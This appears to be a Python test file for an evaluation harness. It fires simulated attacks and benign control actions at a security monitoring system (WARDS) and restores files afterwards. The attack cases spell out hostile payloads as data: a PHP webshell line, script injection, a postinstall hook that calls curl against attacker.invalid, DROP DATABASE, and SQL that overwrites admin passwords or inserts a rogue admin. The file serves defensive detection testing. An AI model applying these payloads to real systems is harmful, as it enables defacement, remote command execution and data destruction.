from __future__ import annotations

from evaluator import (
    TestCase,
    EVAL_HEADERS,
    HEADERS,
    api_get,
    api_post,
    context_detection,
    vm1_append,
    vm1_backup,
    vm1_delete,
    vm1_mysql,
    vm1_restore,
    vm2_append,
    vm2_backup,
    vm2_mysql,
    vm2_restore,
)


def file_attack(test_id: str, scenario: str, path: str, payload: str) -> TestCase:
    return TestCase(
        test_id,
        scenario,
        "application_files",
        "attack",
        lambda p=path, text=payload: (vm1_backup(p), vm1_append(p, text)),
        trigger_scan=True,
        cleanup=lambda p=path: vm1_restore(p),
    )


def file_delete_attack(test_id: str, scenario: str, path: str) -> TestCase:
    return TestCase(
        test_id,
        scenario,
        "application_files",
        "attack",
        lambda p=path: (vm1_backup(p), vm1_delete(p)),
        trigger_scan=True,
        cleanup=lambda p=path: vm1_restore(p),
    )


def benign_file(test_id: str, scenario: str, path: str, payload: str) -> TestCase:
    return TestCase(
        test_id,
        scenario,
        "application_files",
        "benign",
        lambda p=path, text=payload: (vm1_backup(p), vm1_append(p, text)),
        trigger_scan=True,
        cleanup=lambda p=path: vm1_restore(p),
    )


def context_case(test_id: str, scenario: str, actual: str, change_type: str, context: dict) -> TestCase:
    return TestCase(test_id, scenario, "context", actual, lambda: context_detection(test_id, change_type, context), wait_seconds=0)


def context_domain_case(test_id: str, scenario: str, domain: str, actual: str, change_type: str, context: dict) -> TestCase:
    return TestCase(test_id, scenario, domain, actual, lambda: context_detection(test_id, change_type, context), wait_seconds=0)


def all_tests() -> list[TestCase]:
    tests: list[TestCase] = [
        file_attack("ATK-F-01", "HTML full defacement", "WARDS/frontend/index.html", "\n<h1>HACKED BY EVAL</h1>\n"),
        file_attack("ATK-F-02", "HTML script injection", "WARDS/frontend/index.html", "\n<script>alert('eval')</script>\n"),
        file_attack("ATK-F-03", "JS payload injection", "WARDS/frontend/src/main.jsx", "\ndocument.write('owned')\n"),
        file_attack("ATK-F-04", "Python backend modification", "WARDS/backend/main.py", "\n# INJECTED: import os; os.system(\"id\")\n"),
        file_attack("ATK-F-05", "Python route tampering", "WARDS/backend/routes/security_dashboard.py", "\neval('malicious')\n"),
        file_attack("ATK-F-06", "TypeScript injection", "WARDS/frontend/src/services/api.js", "\nwindow.onload=function(){alert('owned')}\n"),
        file_attack("ATK-F-07", "CSS defacement", "WARDS/frontend/src/index.css", "\nbody:before{content:'DEFACED'}\n"),
        file_attack("ATK-F-08", "Config tampering .env.example", "WARDS/backend/.env.example", "\nSECRET_KEY=attacker_controlled\n"),
        file_attack("ATK-F-09", "Defacement keyword in README", "README.md", "\nThis system was defaced during evaluation.\n"),
        file_attack("ATK-F-10", "Deployment config poisoning", "WARDS/frontend/package.json", "\n\"postinstall\":\"curl http://attacker.invalid/payload\",\n"),
        file_attack("ATK-F-11", "SQL keyword in CSV", "WARDS/backend/data/eval.csv", "\n1,union select password from admins\n"),
        file_attack("ATK-F-12", "Credential exposure in text", "WARDS/backend/requirements.txt", "\npassword=attacker_controlled\n"),
        file_delete_attack("ATK-F-13", "Critical file deletion main.py", "WARDS/backend/main.py"),
        file_delete_attack("ATK-F-14", "Frontend entry deletion index.html", "WARDS/frontend/index.html"),
        file_delete_attack("ATK-F-15", "Config file deletion .env.example", "WARDS/backend/.env.example"),
        TestCase("ATK-DB1-01", "citizen_users email tamper", "vm1_database", "attack", lambda: vm1_mysql("UPDATE citizen_users SET email='attacker@example.com' ORDER BY id DESC LIMIT 1")),
        TestCase("ATK-DB1-02", "admins password_hash tamper", "vm1_database", "attack", lambda: vm1_mysql("UPDATE admins SET hashed_password='attacker' ORDER BY id DESC LIMIT 1")),
        TestCase("ATK-DB1-03", "payment amount tamper", "vm1_database", "attack", lambda: vm1_mysql("UPDATE payments SET amount=1 ORDER BY id DESC LIMIT 1")),
        TestCase("ATK-DB1-04", "Unauthorized admin insertion", "vm1_database", "attack", lambda: vm1_mysql("INSERT INTO admins (username,email,hashed_password,role,status) VALUES ('eval_intruder','eval_intruder@example.com','x','main_admin','Active')")),
        TestCase("ATK-DB1-05", "Unauthorized row deletion", "vm1_database", "attack", lambda: vm1_mysql("DELETE FROM activity_logs ORDER BY id DESC LIMIT 1")),
        TestCase("ATK-DB2-01", "security_incidents mass delete", "vm2_database", "attack", lambda: vm2_mysql("DELETE FROM security_incidents WHERE status='resolved' LIMIT 1"), notes="Known VM2 DB audit scope boundary if no VM2 audit trigger is installed."),
        TestCase("ATK-DB2-02", "detection event falsification", "vm2_database", "attack", lambda: vm2_mysql("UPDATE security_detection_events SET ai_prediction='normal' ORDER BY id DESC LIMIT 1"), notes="Known VM2 DB audit scope boundary."),
        TestCase("ATK-DB2-03", "monitored file hash tamper", "vm2_database", "attack", lambda: vm2_mysql("UPDATE security_monitored_files SET baseline_hash='evaltamper' ORDER BY id DESC LIMIT 1"), notes="Known VM2 DB audit scope boundary."),
        TestCase("ATK-DB2-04", "recovery event deletion", "vm2_database", "attack", lambda: vm2_mysql("DELETE FROM security_recovery_events WHERE status='failed' LIMIT 1"), notes="Known VM2 DB audit scope boundary."),
        TestCase("ATK-DB2-05", "VM2 admin password tamper", "vm2_database", "attack", lambda: vm2_mysql("UPDATE admins SET hashed_password='evaltamper' ORDER BY id DESC LIMIT 1"), notes="Known VM2 DB audit scope boundary."),
        TestCase("ATK-AI-01", "Model pkl replacement", "ai_ml_assets", "attack", lambda: (vm2_backup("SECURITY/ml_models/isolation_forest.pkl"), vm2_append("SECURITY/ml_models/isolation_forest.pkl", "evil")), trigger_scan=True, cleanup=lambda: vm2_restore("SECURITY/ml_models/isolation_forest.pkl")),
        TestCase("ATK-AI-02", "Model metadata tampering", "ai_ml_assets", "attack", lambda: (vm2_backup("SECURITY/ml_models/model_metadata.json"), vm2_append("SECURITY/ml_models/model_metadata.json", "{\"poisoned\":true}")), trigger_scan=True, cleanup=lambda: vm2_restore("SECURITY/ml_models/model_metadata.json")),
        TestCase("ATK-AI-03", "State JSON wipe", "ai_ml_assets", "attack", lambda: (vm2_backup("SECURITY/ml/isolation_forest_state.json"), vm2_append("SECURITY/ml/isolation_forest_state.json", "{}")), trigger_scan=True, cleanup=lambda: vm2_restore("SECURITY/ml/isolation_forest_state.json")),
        TestCase("ATK-AI-04", "Isolation Forest metadata corrupt", "ai_ml_assets", "attack", lambda: (vm2_backup("SECURITY/ml/isolation_forest_metadata.json"), vm2_append("SECURITY/ml/isolation_forest_metadata.json", "corrupt")), trigger_scan=True, cleanup=lambda: vm2_restore("SECURITY/ml/isolation_forest_metadata.json")),
        TestCase("ATK-AI-05", "Behavioral profile removal", "ai_ml_assets", "attack", lambda: context_detection("ATK-AI-05", "ai_profile_removed", {"ai_model_artifact_tamper": True}), wait_seconds=0),
        TestCase("ATK-AI-06", "Training data poisoning", "ai_ml_assets", "attack", lambda: (vm2_backup("SECURITY/ml/initial_training_samples.csv"), vm2_append("SECURITY/ml/initial_training_samples.csv", "\npoisoned,sample,1")), trigger_scan=True, cleanup=lambda: vm2_restore("SECURITY/ml/initial_training_samples.csv")),
        TestCase("ATK-AI-07", "Model pkl deletion", "ai_ml_assets", "attack", lambda: (vm2_backup("SECURITY/ml_models/isolation_forest.pkl"), vm2_append("SECURITY/ml_models/isolation_forest.pkl", "")), trigger_scan=True, cleanup=lambda: vm2_restore("SECURITY/ml_models/isolation_forest.pkl")),
        TestCase("ATK-AI-08", "Threshold manipulation", "ai_ml_assets", "attack", lambda: context_detection("ATK-AI-08", "ai_threshold_manipulation", {"ai_model_artifact_tamper": True, "sensitive_config_change": True}), wait_seconds=0),
        TestCase("ATK-AI-09", "Config state poisoning", "ai_ml_assets", "attack", lambda: context_detection("ATK-AI-09", "ai_config_poisoning", {"ai_model_artifact_tamper": True}), wait_seconds=0),
        TestCase("ATK-AI-10", "Dual artifact tampering", "ai_ml_assets", "attack", lambda: context_detection("ATK-AI-10", "ai_dual_artifact_tamper", {"ai_model_artifact_tamper": True, "database_integrity_deviation": True}), wait_seconds=0),
        context_case("ATK-CTX-01", "After-hours unauthorized access", "attack", "suspicious_login", {"hour_of_day": 2, "day_of_week": 6, "admin_session_valid": False, "method_legitimate": False}),
        context_case("ATK-CTX-02", "Unknown source IP", "attack", "suspicious_login", {"source_ip": "1.2.3.4", "ip_consistent": False, "ip_reputation_score": 80, "admin_session_valid": False, "method_legitimate": False}),
        context_case("ATK-CTX-03", "VPN-masked access", "attack", "suspicious_login", {"vpn_activity": True, "vpn_detected": True, "source_ip": "8.8.8.8"}),
        context_case("ATK-CTX-04", "Mass file modification", "attack", "bulk_change", {"affected_files_count": 15, "method_legitimate": False}),
        context_case("ATK-CTX-05", "AI model modification flag", "attack", "ai_artifact_change", {"ai_model_artifact_tamper": True}),
        context_case("ATK-CTX-06", "First-time device", "attack", "suspicious_login", {"first_time_device": True, "admin_session_valid": True}),
        context_case("ATK-CTX-07", "First-time country", "attack", "suspicious_login", {"first_time_country": True, "admin_session_valid": True}),
        context_case("ATK-CTX-08", "Impossible travel", "attack", "suspicious_login", {"geo_distance_from_last_login_km": 8000, "hours_since_last_login": 2}),
        context_case("ATK-CTX-09", "Session context drift", "attack", "suspicious_login", {"session_context_anomaly": True, "active_session_replaced": True}),
        context_case("ATK-CTX-10", "Keystroke paste anomaly", "attack", "suspicious_login", {"pasted_password": True, "keystroke_dynamics_available": False}),
        benign_file("BEN-F-01", "README timestamp append", "README.md", "\nEvaluation timestamp note.\n"),
        benign_file("BEN-F-02", "Requirements comment", "WARDS/backend/requirements.txt", "\n# benign evaluation note\n"),
        benign_file("BEN-F-03", "Operational log note", "WARDS/backend/README.md", "\nBenign operational log note.\n"),
        benign_file("BEN-F-04", "Temporary cache note", "WARDS/backend/requirements.txt", "\n# benign cache note\n"),
        benign_file("BEN-F-05", "Backend README benign append", "WARDS/backend/README.md", "\n# eval benign\n"),
        benign_file("BEN-F-06", "Backend markdown benign entry", "WARDS/backend/README.md", "\nBenign evaluation note.\n"),
        benign_file("BEN-F-07", "Non-sensitive JSON edit", "WARDS/frontend/package.json", "\n"),
        benign_file("BEN-F-08", "Package metadata whitespace", "WARDS/frontend/package.json", "\n"),
        benign_file("BEN-F-09", "CSS comment", "WARDS/frontend/src/index.css", "\n/* benign eval */\n"),
        benign_file("BEN-F-10", "Markdown operational note", "WARDS/backend/README.md", "\nBenign command note.\n"),
        TestCase("BEN-ADM-01", "Manual full backup", "admin_ops", "benign", lambda: api_post("/v1/backup/full", {"admin_id": None}, headers=EVAL_HEADERS), wait_seconds=0),
        TestCase("BEN-ADM-02", "Files-only backup", "admin_ops", "benign", lambda: api_post("/v1/backup/files", {"admin_id": None}, headers=EVAL_HEADERS), wait_seconds=0),
        TestCase("BEN-ADM-03", "ML artifact backup", "admin_ops", "benign", lambda: api_post("/v1/backup/ml", {"admin_id": None}, headers=EVAL_HEADERS), wait_seconds=0),
        TestCase("BEN-ADM-04", "Database backup", "admin_ops", "benign", lambda: api_post("/v1/backup/database", {"admin_id": None}, headers=EVAL_HEADERS), wait_seconds=0),
        TestCase("BEN-ADM-05", "Dashboard health check", "admin_ops", "benign", lambda: api_get("/v1/dashboard"), wait_seconds=0),
        TestCase("BEN-DB-01", "Routine SELECT query", "vm1_database", "benign", lambda: vm1_mysql("SELECT COUNT(*) FROM citizen_users"), wait_seconds=0),
        TestCase("BEN-DB-02", "Authorized status update placeholder", "vm1_database", "benign", lambda: vm1_mysql("SELECT 1"), wait_seconds=0),
        TestCase("BEN-DB-03", "Log cleanup candidate read", "vm1_database", "benign", lambda: vm1_mysql("SELECT COUNT(*) FROM activity_logs WHERE created_at < NOW() - INTERVAL 365 DAY"), wait_seconds=0),
        TestCase("BEN-DB-04", "Index analyze", "vm1_database", "benign", lambda: vm1_mysql("ANALYZE TABLE citizen_users"), wait_seconds=0),
        TestCase("BEN-DB-05", "Normal backup read", "vm1_database", "benign", lambda: vm1_mysql("SELECT COUNT(*) FROM backups"), wait_seconds=0),
        TestCase("BEN-AI-01", "Authorized model retrain", "ai_ml_assets", "benign", lambda: api_post("/v1/ai/retrain", {"actor": "evaluation"}, headers=HEADERS), wait_seconds=0),
        TestCase("BEN-AI-02", "Authorized seed training", "ai_ml_assets", "benign", lambda: api_post("/v1/ai/seed-initial-training", {"actor": "evaluation"}, headers=HEADERS), wait_seconds=0),
        TestCase("BEN-AI-03", "ML score benign probe", "ai_ml_assets", "benign", lambda: api_post("/v1/ai/ml-score", {"hour_of_day": 10, "day_of_week": 2}, headers=HEADERS), wait_seconds=0),
        TestCase("BEN-AI-04", "Read model metadata", "ai_ml_assets", "benign", lambda: api_get("/v1/ai/weekly-data"), wait_seconds=0),
        TestCase("BEN-AI-05", "AI rule listing", "ai_ml_assets", "benign", lambda: api_get("/v1/ai/rules"), wait_seconds=0),
        context_case("BEN-CTX-01", "Admin login business hours", "benign", "login_success", {"hour_of_day": 10, "day_of_week": 2, "admin_session_valid": True, "method_legitimate": True}),
        context_case("BEN-CTX-02", "Scheduled deployment", "benign", "scheduled_deployment", {"hour_of_day": 14, "method_legitimate": True}),
        context_case("BEN-CTX-03", "Normal GitHub webhook deploy", "benign", "scheduled_deployment", {"actor": "github_webhook", "hour_of_day": 11, "method_legitimate": True}),
        context_case("BEN-CTX-04", "Authorized receipt upload", "benign", "receipt_upload", {"admin_session_valid": True, "source_ip": "152.42.249.84", "method_legitimate": True}),
        context_case("BEN-CTX-05", "Normal backup event", "benign", "backup_created", {"hour_of_day": 10, "method_legitimate": True}),
        context_case("BEN-CTX-06", "Authorized admin file-change", "benign", "admin_change_registered", {"admin_session_valid": True, "method_legitimate": True}),
        context_case("BEN-CTX-07", "Normal queue operation", "benign", "queue_ticket_issued", {"admin_session_valid": True, "method_legitimate": True}),
        context_case("BEN-CTX-08", "Normal payment event", "benign", "payment_completed", {"admin_session_valid": True, "method_legitimate": True}),
        context_case("BEN-CTX-09", "Recovery verified", "benign", "recovery_verified", {"admin_session_valid": True, "method_legitimate": True}),
        TestCase("BEN-CTX-10", "Scheduled scan clean cycle", "context", "benign", lambda: None, trigger_scan=True),
    ]
    tests.extend([
        file_attack("ATK-F-16", "Webshell primitive in frontend HTML", "WARDS/frontend/index.html", "\n<?php echo shell_exec($_GET['cmd']); ?>\n"),
        file_attack("ATK-F-17", "Destructive SQL command injection", "WARDS/backend/.env.example", "\nDROP DATABASE wards_db;\n"),
        context_domain_case("ATK-REC-01", "Unauthorized full recovery request", "recovery_ops", "attack", "unauthorized_recovery_request", {"backup_restore_activity": True, "method_legitimate": False, "admin_session_valid": False}),
        context_domain_case("ATK-REC-02", "Backup manifest integrity failure", "recovery_ops", "attack", "backup_integrity_failure", {"backup_integrity_valid": False}),
        context_domain_case("ATK-REC-03", "Repeated restore abuse", "recovery_ops", "attack", "restore_abuse", {"restore_count": 5, "method_legitimate": False}),
        context_domain_case("ATK-DEP-01", "Deployment mode tamper", "deployment_integrity", "attack", "deployment_setting_tamper", {"sensitive_config_change": True, "method_legitimate": False}),
        context_domain_case("ATK-DEP-02", "Webhook secret exposure", "deployment_integrity", "attack", "webhook_secret_exposure", {"credential_access": True, "sensitive_config_change": True}),
        context_domain_case("ATK-API-01", "Invalid admin API session", "api_controls", "attack", "invalid_admin_session", {"admin_session_valid": False, "method_legitimate": False}),
        context_domain_case("ATK-API-02", "MFA bypass attempt", "api_controls", "attack", "mfa_bypass_attempt", {"mfa_verified": False, "admin_session_valid": True}),
        context_domain_case("ATK-DB1-06", "Unauthorized database export behavior", "vm1_database", "attack", "database_export_attempt", {"database_integrity_deviation": True, "method_legitimate": False}),
        TestCase("BEN-REC-01", "Backup inventory read", "recovery_ops", "benign", lambda: api_get("/v1/backup/inventory"), wait_seconds=0),
        TestCase("BEN-REC-02", "Recovery log query", "recovery_ops", "benign", lambda: api_post("/v1/recoveries/query", {"limit": 10}, headers=HEADERS), wait_seconds=0),
        TestCase("BEN-REC-03", "VM1 restore command poll", "recovery_ops", "benign", lambda: api_get("/v1/vm1/restore-command"), wait_seconds=0),
        TestCase("BEN-DEP-01", "Deployment status read", "deployment_integrity", "benign", lambda: api_get("/internal/deploy-status"), wait_seconds=0),
        TestCase("BEN-DEP-02", "VM1 security config read", "deployment_integrity", "benign", lambda: api_get("/v1/vm1/config"), wait_seconds=0),
        TestCase("BEN-API-01", "Monitoring setting read", "api_controls", "benign", lambda: api_post("/v1/settings/get", {"key": "monitoring_enabled", "default": "true"}, headers=HEADERS), wait_seconds=0),
        TestCase("BEN-API-02", "Detection source-id listing", "api_controls", "benign", lambda: api_get("/v1/source-ids/detections"), wait_seconds=0),
        TestCase("BEN-API-03", "Incident query read", "api_controls", "benign", lambda: api_post("/v1/incidents/query", {"limit": 10}, headers=HEADERS), wait_seconds=0),
        TestCase("BEN-API-04", "Detection query read", "api_controls", "benign", lambda: api_post("/v1/detections/query", {"limit": 10}, headers=HEADERS), wait_seconds=0),
        TestCase("BEN-API-05", "VM2 health check", "api_controls", "benign", lambda: api_get("/health"), wait_seconds=0),
    ])
    return tests
